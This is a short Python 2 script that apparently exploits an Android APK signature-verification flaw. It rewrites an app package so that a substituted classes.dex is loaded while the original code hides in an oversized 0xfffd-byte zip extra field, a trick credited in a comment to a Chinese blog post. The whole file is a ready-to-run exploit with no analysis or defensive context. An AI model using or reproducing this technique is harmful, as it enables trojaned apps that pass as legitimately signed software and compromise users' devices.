import zipfile
import sys

newClassesData = None

#def monkeyFileHeader(self):
#	return realFileHeader(self)

def writeZip(originalFile, newClassesDex, newFile):
	newClassesData = None
	with open(newClassesDex, "rb") as classesFile:
		#read the original classes.dex
		newClassesData = classesFile.read()
	origZip = zipfile.ZipFile(originalFile, "r")
	newZip = zipfile.ZipFile(newFile, "w")
	#loop through every file in the original zip file, and copy them
	#paying special attention to classes.dex
	#if found replace it with an extra sized 0xfffd, as explained on http://blog.sina.com.cn/s/blog_be6dacae0101bksm.html
	for info in origZip.infolist():
		data = origZip.read(info)
		print(info.FileHeader())
		if info.filename == "classes.dex":
			olddata = data[3:]
			newextra = olddata + ('A' * (0xfffd - len(olddata)))
			myClassesData = newClassesData + ('B' * (len(data) - len(newClassesData)))
			info.extra = newextra
			info.compress_type = zipfile.ZIP_STORED
			newZip.writestr(info, myClassesData)
			info.extra = ""
		else:
			newZip.writestr(info, data)
		print(info.FileHeader())
	newZip.close()
	origZip.close()


#realFileHeader = zipfile.ZipInfo.FileHeader;
#zipfile.ZipInfo.FileHeader = monkeyFileHeader
writeZip(sys.argv[1], sys.argv[2], sys.argv[3])
